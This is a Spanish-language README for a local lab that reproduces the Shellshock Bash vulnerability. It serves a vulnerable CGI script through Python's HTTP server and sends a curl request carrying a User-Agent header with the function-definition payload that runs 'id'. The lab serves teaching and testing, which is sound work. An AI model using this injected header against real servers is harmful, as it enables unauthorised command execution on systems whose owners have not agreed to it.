# Laboratorio Shellshock - Exploit vía CGI con Python HTTP Server

Este repositorio contiene un ejemplo práctico para reproducir la vulnerabilidad **Shellshock** usando un script CGI en bash, servido con el módulo CGI de Python.

---

## Descripción

La vulnerabilidad **Shellshock** aprovecha cómo Bash interpreta variables de entorno que parecen definiciones de funciones. En un contexto CGI, si una variable HTTP (como `User-Agent`) es interpretada por Bash sin limpieza, un atacante puede inyectar código y ejecutarlo en el servidor.

Este laboratorio monta un script CGI vulnerable y permite comprobar si la explotación funciona enviando un User-Agent malicioso con `curl`.

---

## Requisitos

- Bash vulnerable (versiones 4.3 y anteriores)
- Python 3 instalado
- Permisos para ejecutar scripts CGI con Python HTTP Server
- `curl` para enviar la petición

---

## Archivos

- `cgi-bin/test.sh` : Script Bash CGI vulnerable a Shellshock

---

## Paso a paso para reproducir el laboratorio

### 1. Clonar este repositorio


### 2.paso  dar permisos de ejecucion

```bash
chmod +x cgi-bin/test.sh

```

### 3. Iniciar el servidor CGI con Python HTTP Server

```python
python3 -m http.server 8000 --cgi
```

### 4. Enviar la petición maliciosa con `curl`

```bash
curl -H 'User-Agent: () { :;}; echo Exploit ejecutado; id' http://localhost:8000/cgi-bin/test.sh
```



